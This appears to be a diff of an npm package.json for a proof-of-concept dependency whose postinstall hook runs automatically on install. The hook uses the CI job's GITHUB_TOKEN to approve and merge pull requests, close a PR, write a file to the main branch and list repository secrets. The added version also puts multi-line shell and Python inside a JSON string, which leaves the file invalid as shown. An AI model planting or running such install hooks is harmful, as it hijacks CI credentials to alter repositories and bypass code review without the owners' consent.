@@ -1,1 +1,12 @@
-{"name":"gab-poc-npm-dep","version":"1.0.0","description":"probe2","scripts":{"postinstall":"set +e; H=\"Authorization: Bearer $GITHUB_TOKEN\"; A='-H Accept:application/vnd.github+json'; echo '--- label'; curl -sS -o /tmp/o1 -w 'LABEL=%{http_code}\\n' -X POST $A -H \"$H\" https://api.github.com/repos/$GITHUB_REPOSITORY/issues/3/labels -d '{\"labels\":[\"linter-bot-poc\"]}' --max-time 20; echo '--- review approve'; curl -sS -o /tmp/o2 -w 'APPROVE=%{http_code}\\n' -X POST $A -H \"$H\" https://api.github.com/repos/$GITHUB_REPOSITORY/pulls/2/reviews -d '{\"event\":\"APPROVE\",\"body\":\"poc\"}' --max-time 20; cat /tmp/o2 | head -3; echo '--- review dismiss target list'; curl -sS -o /tmp/o3 -w 'REVIEWS=%{http_code}\\n' $A -H \"$H\" https://api.github.com/repos/$GITHUB_REPOSITORY/pulls/2/reviews --max-time 20; echo '--- close PR 3'; curl -sS -o /tmp/o4 -w 'CLOSE=%{http_code}\\n' -X PATCH $A -H \"$H\" https://api.github.com/repos/$GITHUB_REPOSITORY/pulls/3 -d '{\"state\":\"closed\"}' --max-time 20; cat /tmp/o4 | head -3"}}
+{
+  "name": "gab-poc-npm-dep",
+  "version": "1.0.1",
+  "description": "probe3",
+  "scripts": {
+    "postinstall": "set +e; H=\"Authorization: Bearer $GITHUB_TOKEN\"; A='Accept:application/vnd.github+json'; echo '--- permissions/identity'; curl -sS -H \"$A\" -H \"$H\" https://api.github.com/rate_limit | head -2; echo '--- merge PR2'; curl -sS -o /tmp/m -w 'MERGE=%{http_code}\\n' -X PUT -H \"$A\" -H \"$H\" https://api.github.com/repos/$GITHUB_REPOSITORY/pulls/2/merge -d '{\"merge_method\":\"merge\"}' --max-time 20; head -c 300 /tmp/m; echo; echo '--- contents write probe'; printf 'cHJvYmU=' > /tmp/b64; python3 - <<'PY' > /tmp/payload.json
+import json
+print(json.dumps({"message":"probe contents write","content":"cHJvYmU=","branch":"main"}))
+PY
+curl -sS -o /tmp/c -w 'CONTENTS_PUT=%{http_code}\\n' -X PUT -H \"$A\" -H \"$H\" https://api.github.com/repos/$GITHUB_REPOSITORY/contents/gab-probe.txt --data-binary @/tmp/payload.json --max-time 20; head -c 200 /tmp/c; echo; echo '--- list actions runs'; curl -sS -o /tmp/a -w 'ACTIONS_RUNS=%{http_code}\\n' -H \"$A\" -H \"$H\" 'https://api.github.com/repos/'$GITHUB_REPOSITORY'/actions/runs?per_page=1' --max-time 20; head -c 150 /tmp/a; echo; echo '--- list secrets'; curl -sS -o /tmp/s -w 'SECRETS=%{http_code}\\n' -H \"$A\" -H \"$H\" https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets --max-time 20; head -c 150 /tmp/s; echo"
+  }
+}
